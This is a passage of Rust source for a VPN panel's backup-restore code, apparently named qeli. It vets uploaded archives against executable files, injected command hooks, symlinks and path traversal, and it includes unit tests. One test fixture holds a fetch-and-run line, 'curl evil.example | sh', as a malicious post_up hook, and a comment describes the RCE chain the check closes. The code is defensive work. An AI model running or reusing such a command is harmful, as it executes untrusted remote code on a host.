            vet_staged_dir(&path, hook_files)?;
            continue;
        }
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            if md.permissions().mode() & 0o111 != 0 {
                return Err(format!(
                    "refused: '{name}' is executable — a qeli backup holds configs and keys, \
                     never programs"
                ));
            }
        }
        if !name.ends_with(".conf") {
            continue; // keys, usage.json, … carry no executable semantics
        }
        let text = match std::fs::read_to_string(&path) {
            Ok(t) => t,
            Err(e) => return Err(format!("cannot read staged '{name}': {e}")),
        };
        let live = std::fs::read_to_string(format!("/etc/qeli/{name}")).unwrap_or_default();
        vet_config_file(&name, &text, &live)?;
    }
    Ok(())
}

/// Apply the hook/validation rules to one staged `.conf`, given the file it would
/// replace (empty when it is a new file).
fn vet_server_config(name: &str, staged: &str, live: &str) -> Result<(), String> {
    let (config, findings) = crate::config::parse_server_config_reporting(staged)
        .map_err(|e| format!("refused: server config '{name}' is invalid: {e}"))?;
    if !findings.is_empty() {
        return Err(format!(
            "refused: server config '{name}' contains unsupported or unreadable settings: {}",
            findings.join("; ")
        ));
    }
    let live_config = crate::config::parse_server_config(live).ok();
    for profile in &config.profiles {
        if profile.routing.post_up.is_empty() && profile.routing.post_down.is_empty() {
            continue;
        }
        let unchanged = live_config
            .as_ref()
            .and_then(|current| {
                current
                    .profiles
                    .iter()
                    .find(|candidate| candidate.name == profile.name)
            })
            .is_some_and(|current| {
                current.routing.post_up == profile.routing.post_up
                    && current.routing.post_down == profile.routing.post_down
            });
        if !unchanged {
            return Err(format!(
                "refused: '{name}' profile '{}' introduces or changes routing.post_up/post_down",
                profile.name
            ));
        }
    }
    crate::server::validate_profiles(&config)
        .map_err(|e| format!("refused: '{name}' would not start: {e}"))?;
    crate::config::users::UsersDb {
        users: config.auth.users.clone(),
        groups: config.auth.groups.clone(),
    }
    .validate_access_controls()
    .map_err(|e| format!("refused: '{name}' has invalid inline access controls: {e}"))?;
    Ok(())
}

fn vet_config_file(name: &str, staged: &str, live: &str) -> Result<(), String> {
    if staged
        .lines()
        .map(str::trim)
        .any(|line| line.starts_with("[user:") || line.starts_with("[group:"))
        && !staged
            .lines()
            .map(str::trim)
            .any(|line| line.starts_with("[profile:"))
    {
        return crate::config::users::UsersDb::parse_strict(staged, name)
            .map(|_| ())
            .map_err(|e| format!("refused: users database '{name}' is invalid: {e}"));
    }
    if crate::config::parse_server_config(staged).is_ok_and(|config| !config.profiles.is_empty()) {
        return vet_server_config(name, staged, live);
    }
    // An empty users database is valid and intentionally has no `[user:*]`
    // marker. Accept any file whose complete key set is consumed by UsersDb.
    if crate::config::users::UsersDb::parse_strict(staged, name).is_ok() {
        return Ok(());
    }
    // Otherwise treat it as a client profile.
    if let Ok(c) = crate::config::parse_client_config_strict(staged) {
        let live_c = crate::config::parse_client_config(live).ok();
        let staged_hooks = (
            c.auth.password_command.clone().unwrap_or_default(),
            c.routing.post_up.clone(),
            c.routing.post_down.clone(),
        );
        if !staged_hooks.0.is_empty() || !staged_hooks.1.is_empty() || !staged_hooks.2.is_empty() {
            let unchanged = live_c.is_some_and(|l| {
                l.auth.password_command.as_deref().unwrap_or_default() == staged_hooks.0.as_str()
                    && l.routing.post_up == staged_hooks.1
                    && l.routing.post_down == staged_hooks.2
            });
            if !unchanged {
                return Err(format!(
                    "refused: client profile '{name}' sets password_command/post_up/post_down, \
                     which execute commands on whoever imports it. These cannot be introduced \
                     through the panel."
                ));
            }
        }
        return Ok(());
    }
    Err(format!(
        "refused: '{name}' is a .conf file but is not a valid qeli server, client or users config"
    ))
}

/// Prove that publishing cannot walk through a live symlink or fail halfway on
/// a file/directory type mismatch. In exact mode, the current top-level pruner
/// can remove an entire absent directory, but it deliberately does not recurse
/// into directories present in both trees. Refuse nested extras instead of
/// claiming an exact restore while silently retaining them.
fn vet_publish_shape(
    staged: &std::path::Path,
    live: &std::path::Path,
    exact: bool,
    depth: usize,
) -> Result<(), String> {
    let live_root_meta = match std::fs::symlink_metadata(live) {
        Ok(metadata) => Some(metadata),
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
        Err(error) => return Err(format!("cannot inspect live restore target: {error}")),
    };
    if live_root_meta
        .as_ref()
        .is_some_and(|metadata| metadata.file_type().is_symlink())
    {
        return Err(format!(
            "refused: live restore target '{}' is a symlink",
            live.display()
        ));
    }

    let entries = std::fs::read_dir(staged)
        .map_err(|error| format!("staged tree unreadable during publish check: {error}"))?;
    for entry in entries {
        let entry = entry.map_err(|error| format!("cannot inspect staged entry: {error}"))?;
        let staged_path = entry.path();
        let live_path = live.join(entry.file_name());
        let staged_meta = std::fs::symlink_metadata(&staged_path).map_err(|error| {
            format!("cannot inspect staged '{}': {error}", staged_path.display())
        })?;
        let live_meta = match std::fs::symlink_metadata(&live_path) {
            Ok(metadata) => Some(metadata),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
            Err(error) => {
                return Err(format!(
                    "cannot inspect live restore target '{}': {error}",
                    live_path.display()
                ))
            }
        };
        if live_meta
            .as_ref()
            .is_some_and(|metadata| metadata.file_type().is_symlink())
        {
            return Err(format!(
                "refused: live restore target '{}' is a symlink",
                live_path.display()
            ));
        }
        if let Some(live_meta) = &live_meta {
            if staged_meta.is_dir() != live_meta.is_dir() {
                return Err(format!(
                    "refused: staged/live type mismatch at '{}'",
                    live_path.display()
                ));
            }
        }
        if staged_meta.is_dir() && live_meta.is_some() {
            vet_publish_shape(&staged_path, &live_path, exact, depth + 1)?;
        }
    }

    if exact && depth > 0 && live_root_meta.is_some() {
        let live_entries = std::fs::read_dir(live)
            .map_err(|error| format!("cannot scan live directory '{}': {error}", live.display()))?;
        for entry in live_entries {
            let entry = entry.map_err(|error| format!("cannot inspect live entry: {error}"))?;
            let name = entry.file_name();
            if name.to_string_lossy().starts_with('.') {
                continue;
            }
            if !staged.join(&name).exists() {
                return Err(format!(
                    "refused: exact restore would leave nested live entry '{}' that is absent from the archive; remove it explicitly first",
                    live.join(name).display()
                ));
            }
        }
    }
    Ok(())
}

/// Move every staged file into `dest`, creating directories as needed. Same
/// filesystem, so each `rename` is atomic.
fn publish_staged_tree(root: &str, dest: &str) -> std::io::Result<()> {
    std::fs::create_dir_all(dest)?;
    for entry in std::fs::read_dir(root)?.flatten() {
        let from = entry.path();
        let to = format!("{dest}/{}", entry.file_name().to_string_lossy());
        if entry.metadata()?.is_dir() {
            publish_staged_tree(&from.to_string_lossy(), &to)?;
        } else {
            std::fs::rename(&from, &to)?;
        }
    }
    Ok(())
}

/// Keep only the `keep` newest `.pre-restore-*.tgz` snapshots in /etc/qeli so
/// repeated restores don't grow the config dir without bound. The timestamp is
/// embedded in the name (unix seconds), so lexicographic sort == chronological.
fn prune_pre_restore_snapshots(keep: usize) {
    let mut snaps: Vec<std::path::PathBuf> = match std::fs::read_dir("/etc/qeli") {
        Ok(rd) => rd
            .filter_map(|e| e.ok().map(|e| e.path()))
            .filter(|p| {
                p.file_name()
                    .and_then(|n| n.to_str())
                    .map(|n| n.starts_with(".pre-restore-") && n.ends_with(".tgz"))
                    .unwrap_or(false)
            })
            .collect(),
        Err(_) => return,
    };
    if snaps.len() <= keep {
        return;
    }
    snaps.sort();
    let remove_n = snaps.len() - keep;
    for p in snaps.into_iter().take(remove_n) {
        let _ = std::fs::remove_file(p);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn panel_backup_accepts_custom_managed_paths() {
        let mut config = crate::config::server::ServerConfig::default();
        config.auth.users_file = "/etc/qeli/auth/custom-users.ini".into();
        config.auth.users.push(Default::default());
        let profile = crate::config::server::ProfileConfig {
            name: "tcp".into(),
            identity_key: Some("/etc/qeli/keys/tcp.key".into()),
            ..Default::default()
        };
        config.profiles.push(profile);
        let paths = critical_backup_paths(&config, "/etc/qeli/config/server.ini").unwrap();
        let names: Vec<&str> = paths
            .iter()
            .map(|path| path.archive_path.as_str())
            .collect();
        assert!(names.contains(&"qeli/config/server.ini"));
        assert!(names.contains(&"qeli/auth/custom-users.ini"));
        assert!(names.contains(&"qeli/keys/tcp.key"));
    }

    #[test]
    fn backup_excludes_transient_archives_and_legacy_secret() {
        assert!(TRANSIENT_TAR_EXCLUDES.contains(&"qeli/.pre-restore-*.tgz"));
        assert!(TRANSIENT_TAR_EXCLUDES.contains(&"qeli/.restore-upload-*.tgz"));
        assert!(TRANSIENT_TAR_EXCLUDES.contains(&"qeli/.restore-staging-*"));
        assert!(PORTABLE_TAR_EXCLUDES.contains(&"qeli/panel-secret.key"));
    }

    #[cfg(unix)]
    #[test]
    fn restore_normalizes_private_file_and_directory_modes() {
        use std::os::unix::fs::PermissionsExt;

        let root = std::env::temp_dir().join(format!(
            "qeli-restore-mode-test-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let nested = root.join("identity");
        std::fs::create_dir_all(&nested).unwrap();
        let key = nested.join("profile.key");
        std::fs::write(&key, b"secret").unwrap();
        std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::set_permissions(&nested, std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::set_permissions(&key, std::fs::Permissions::from_mode(0o644)).unwrap();

        normalize_staged_permissions(&root).unwrap();
        assert_eq!(
            std::fs::metadata(&root).unwrap().permissions().mode() & 0o777,
            0o700
        );
        assert_eq!(
            std::fs::metadata(&nested).unwrap().permissions().mode() & 0o777,
            0o700
        );
        assert_eq!(
            std::fs::metadata(&key).unwrap().permissions().mode() & 0o777,
            0o600
        );
        let _ = std::fs::remove_dir_all(root);
    }
    #[test]
    fn panel_backup_refuses_external_or_ambiguous_active_paths() {
        let config = crate::config::server::ServerConfig::default();
        let outside = critical_backup_paths(&config, "/srv/qeli/server.conf").unwrap_err();
        assert!(outside.contains("outside /etc/qeli"));
        let relative = critical_backup_paths(&config, "server.conf").unwrap_err();
        assert!(relative.contains("relative"));
        let traversal = critical_backup_paths(&config, "/etc/qeli/../secret.conf").unwrap_err();
        assert!(traversal.contains("not a normal file"));
    }

    #[test]
    fn restore_requires_external_users_even_when_inline_users_exist() {
        let root = std::env::temp_dir().join(format!(
            "qeli-restore-users-test-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&root).unwrap();
        let config = format!(
            "[auth]\nusers_file = /etc/qeli/auth/users.conf\n\
             [user:inline]\npassword_hash = x\n{}",
            srv("")
        );
        std::fs::write(root.join("server.conf"), config).unwrap();
        let error = vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.conf")
            .expect_err("inline users do not make the configured external database optional");
        assert!(error.contains("requires users database"), "{error}");
        let _ = std::fs::remove_dir_all(root);
    }
    /// Minimal server config; `hooks` is spliced into the profile verbatim.
    fn srv(hooks: &str) -> String {
        format!(
            "[profile:p]\n\
             bind.address = 0.0.0.0\n\
             bind.port = 443\n\
             bind.transport = tcp\n\
             tun.name = vpn0\n\
             tun.address = 10.0.0.1\n\
             pool.cidr = 10.0.0.0/24\n\
             obf.mode = fake-tls\n\
             perf.connection.max_clients = 8\n\
             perf.connection.handshake_timeout_secs = 10\n\
             {hooks}"
        )
    }

    /// The exact-restore prune must key off the archive's file list captured BEFORE
    /// publishing. `publish_staged_tree` MOVES files out of staging, so a prune that
    /// re-reads staging afterwards sees an empty tree and deletes everything it just
    /// restored — `server.conf`, `users.conf`, profile identity keys — while reporting
    /// success. This test pins the contract that made that possible. (Р1)
    #[test]
    fn exact_prune_keeps_what_the_archive_delivered() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-prune-test-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let dest = dir.to_string_lossy().to_string();
        for f in ["server.conf", "users.conf", "leftover.conf"] {
            std::fs::write(dir.join(f), b"x").unwrap();
        }
        std::fs::write(dir.join(".pre-restore-1.tgz"), b"x").unwrap();

        // The archive carried server.conf + users.conf, but NOT leftover.conf.
        let archive: std::collections::HashSet<String> = ["server.conf", "users.conf"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let (removed, errors) = prune_absent(&archive, &dest);

        assert!(errors.is_empty(), "unexpected errors: {errors:?}");
        assert_eq!(
            removed, 1,
            "only the file absent from the archive should go"
        );
        assert!(
            dir.join("server.conf").exists(),
            "restored server.conf was deleted"
        );
        assert!(
            dir.join("users.conf").exists(),
            "restored users.conf was deleted"
        );
        assert!(
            !dir.join("leftover.conf").exists(),
            "stale file should have been pruned"
        );
        assert!(
            dir.join(".pre-restore-1.tgz").exists(),
            "the pre-restore snapshot is the only way back — it must never be pruned"
        );

        // An empty/unreadable archive list must prune NOTHING rather than everything.
        let (removed2, errors2) = prune_absent(&std::collections::HashSet::new(), &dest);
        assert_eq!(
            removed2, 0,
            "an empty archive list must not delete anything"
        );
        assert!(!errors2.is_empty(), "and it must say why");

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn restore_cannot_introduce_a_server_hook() {
        // The link that made the chain RCE: an uploaded backup carrying a post_up that
        // the live config does not have. `/bin/sh -c` runs it at the next profile start.
        let staged = srv("routing.post_up = curl evil.example | sh\n");
        let live = srv("");
        let err = vet_config_file("server.conf", &staged, &live).unwrap_err();
        assert!(
            err.contains("post_up"),
            "a newly introduced hook must be refused, got: {err}"
        );
    }

    #[test]
    fn restore_keeps_working_on_a_server_that_legitimately_uses_hooks() {
        // The rule is "unchanged", not "empty" — otherwise restoring a backup taken on a
        // server whose operator set hooks in the file would always fail.
        let same = srv("routing.post_up = /opt/site/up.sh\n");
        assert!(vet_config_file("server.conf", &same, &same).is_ok());
    }

    #[test]
    fn restore_cannot_change_an_existing_server_hook() {
        let staged = srv("routing.post_up = /opt/site/evil.sh\n");
        let live = srv("routing.post_up = /opt/site/up.sh\n");
        assert!(vet_config_file("server.conf", &staged, &live).is_err());
    }

    #[test]
    fn restore_cannot_wedge_the_worker_with_a_bad_address() {
        // A config the panel would accept but the worker dies on — the crash-loop the
        // stricter validate_profiles now catches, reused here so a restore can't do it.
        let staged = srv("").replace("pool.cidr = 10.0.0.0/24", "pool.cidr = 10.0.0.0/33");
        let err = vet_config_file("server.conf", &staged, &srv("")).unwrap_err();
        assert!(
            err.contains("would not start"),
            "expected the validation gate to fire, got: {err}"
        );
    }

    #[test]
    fn restore_cannot_introduce_a_client_password_command() {
        // Executes on whoever imports the profile, so the same rule applies.
        let staged = "[qeli]\nserver = h:443\nuser = a\npassword_command = /bin/evil\n";
        let live = "[qeli]\nserver = h:443\nuser = a\n";
        assert!(vet_config_file("client-a.conf", staged, live).is_err());
    }

    #[test]
    fn restore_vets_the_active_server_config_without_a_conf_extension() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-vet-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let root = dir.join("qeli");
        std::fs::create_dir_all(&root).unwrap();
        let active = root.join("server.ini");
        let users = root.join("users.conf");

        std::fs::write(&active, srv("")).unwrap();
        std::fs::write(&users, "").unwrap();
        assert!(vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini").is_ok());

        std::fs::write(&active, srv("routing.post_up = /bin/evil\n")).unwrap();
        let hook_error = vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini")
            .expect_err("a non-.conf main config must still be hook-vetted");
        assert!(hook_error.contains("post_up"), "{hook_error}");

        std::fs::write(&active, "this is not ini\n").unwrap();
        assert!(vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini").is_err());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn restore_requires_and_validates_the_users_file_named_by_main_config() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-users-vet-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let root = dir.join("qeli");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("server.ini"), srv("")).unwrap();

        let missing = vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini")
            .expect_err("a non-inline configuration cannot start without its users file");
        assert!(missing.contains("users.conf"), "{missing}");

        std::fs::write(
            root.join("users.conf"),
            "[user:alice]\npassword_hash = hash\nallowed_networks = definitely-not-a-cidr\n",
        )
        .unwrap();
        let malformed = vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini")
            .expect_err("malformed access controls must not be restored");
        assert!(malformed.contains("allowed_networks"), "{malformed}");

        std::fs::write(
            root.join("users.conf"),
            "[user:alice]\npassword_hash = hash\nallowed_networks = 10.0.0.0/8\n",
        )
        .unwrap();
        assert!(vet_staged_tree(&root.to_string_lossy(), "/etc/qeli/server.ini").is_ok());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn restore_rejects_unrecognised_conf_content() {
        let err = vet_config_file("broken.conf", "this is not a qeli config", "")
            .expect_err("unrecognised .conf content must not be published");
        assert!(err.contains("not a valid qeli"), "{err}");
    }

    #[test]
    fn restore_relative_paths_cannot_escape_qeli() {
        assert_eq!(
            qeli_relative_path("/etc/qeli/nested/users.conf").as_deref(),
            Some(std::path::Path::new("nested/users.conf"))
        );
        assert!(qeli_relative_path("/etc/qeli/../shadow").is_none());
        assert!(qeli_relative_path("/etc/qeli").is_none());
        assert!(qeli_relative_path("/etc/qeli-other/server.conf").is_none());
    }

    #[test]
    fn publish_shape_rejects_false_exactness_and_type_conflicts() {
        let dir = std::env::temp_dir().join(format!(
            "qeli-restore-shape-{}-{}",
            std::process::id(),
            RESTORE_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let staged = dir.join("staged");
        let live = dir.join("live");
        std::fs::create_dir_all(staged.join("identity")).unwrap();
        std::fs::create_dir_all(live.join("identity")).unwrap();
        std::fs::write(staged.join("identity/current.key"), "new").unwrap();
        std::fs::write(live.join("identity/current.key"), "old").unwrap();
        std::fs::write(live.join("identity/stale.key"), "stale").unwrap();

        assert!(vet_publish_shape(&staged, &live, false, 0).is_ok());
        let nested = vet_publish_shape(&staged, &live, true, 0)
            .expect_err("exact mode must not silently retain nested extras");
        assert!(nested.contains("stale.key"), "{nested}");

        std::fs::remove_file(live.join("identity/stale.key")).unwrap();
        assert!(vet_publish_shape(&staged, &live, true, 0).is_ok());

        std::fs::remove_dir_all(live.join("identity")).unwrap();
        std::fs::write(live.join("identity"), "not a directory").unwrap();
        let mismatch = vet_publish_shape(&staged, &live, false, 0)
            .expect_err("a file/directory mismatch must fail before publication");
        assert!(mismatch.contains("type mismatch"), "{mismatch}");

        let _ = std::fs::remove_dir_all(&dir);
    }
}
